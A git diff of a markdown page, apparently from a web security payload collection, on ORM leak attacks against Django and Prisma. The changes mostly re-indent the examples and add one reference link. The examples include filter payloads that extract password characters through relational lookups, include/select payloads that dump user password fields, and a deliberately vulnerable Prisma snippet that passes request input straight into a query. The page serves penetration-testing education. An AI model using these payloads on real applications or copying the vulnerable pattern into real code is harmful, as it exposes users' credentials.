@@ -36,8 +36,8 @@ The ORM provides operators for matching parts of a value. These operators can ut
 
 ```json
 {
-    "username": "admin",
-    "password__startswith": "p"
+  "username": "admin",
+  "password__startswith": "p"
 }
 ```
 
@@ -63,7 +63,7 @@ Filtering through user that created an article, and having a password containing
 
 ```json
 {
-    "created_by__user__password__contains": "p"
+  "created_by__user__password__contains": "p"
 }
 ```
 
@@ -79,8 +79,8 @@ Use multiple filters in the same request:
 
 ```json
 {
-    "created_by__departments__employees__user__username__startswith": "p",
-    "created_by__departments__employees__user__id": 1
+  "created_by__departments__employees__user__username__startswith": "p",
+  "created_by__departments__employees__user__id": 1
 }
 ```
 
@@ -118,7 +118,7 @@ Example of an ORM leak in Node.JS with Prisma.
 
 ```js
 const posts = await prisma.article.findMany({
-    where: req.query.filter as any // Vulnerable to ORM Leaks
+  where: req.query.filter as any // Vulnerable to ORM Leaks
 })
 ```
 
@@ -126,11 +126,11 @@ Use the include to return all the fields of user records that have created an ar
 
 ```json
 {
-    "filter": {
-        "include": {
-            "createdBy": true
-        }
+  "filter": {
+    "include": {
+      "createdBy": true
     }
+  }
 }
 ```
 
@@ -138,15 +138,15 @@ Select only one field
 
 ```json
 {
-    "filter": {
+  "filter": {
+    "select": {
+      "createdBy": {
         "select": {
-            "createdBy": {
-                "select": {
-                    "password": true
-                }
-            }
+          "password": true
         }
+      }
     }
+  }
 }
 ```
 
@@ -160,37 +160,37 @@ Select only one field
 
 ```json
 {
-    "query": {
-        "createdBy": {
-            "departments": {
+  "query": {
+    "createdBy": {
+      "departments": {
+        "some": {
+          "employees": {
+            "some": {
+              "departments": {
                 "some": {
-                    "employees": {
+                  "employees": {
+                    "some": {
+                      "departments": {
                         "some": {
-                            "departments": {
-                                "some": {
-                                    "employees": {
-                                        "some": {
-                                            "departments": {
-                                                "some": {
-                                                    "employees": {
-                                                        "some": {
-                                                            "{fieldToLeak}": {
-                                                                "startsWith": "{testStartsWith}"
-                                                            }
-                                                        }
-                                                    }
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
+                          "employees": {
+                            "some": {
+                              "{fieldToLeak}": {
+                                "startsWith": "{testStartsWith}"
+                              }
                             }
+                          }
                         }
+                      }
                     }
+                  }
                 }
+              }
             }
+          }
         }
+      }
     }
+  }
 }
 ```
 
@@ -227,6 +227,7 @@ Only in Ransack < `4.0.0`.
 
 * [ORM Injection - HackTricks - July 30, 2024](https://book.hacktricks.xyz/pentesting-web/orm-injection)
 * [ORM Leak Exploitation Against SQLite - Louis Nyffenegger - July 30, 2024](https://pentesterlab.com/blog/orm-leak-with-sqlite3)
+* [ORM Leaking More Than You Joined For - Alex Brown - December 18, 2025](https://www.elttam.com/blog/leaking-more-than-you-joined-for/)
 * [plORMbing your Django ORM - Alex Brown - June 24, 2024](https://www.elttam.com/blog/plormbing-your-django-orm/)
 * [plORMbing your Prisma ORM with Time-based Attacks - Alex Brown - July 9, 2024](https://www.elttam.com/blog/plorming-your-primsa-orm/)
 * [QuerySet API reference - Django - August 8, 2024](https://docs.djangoproject.com/en/5.1/ref/models/querysets/)
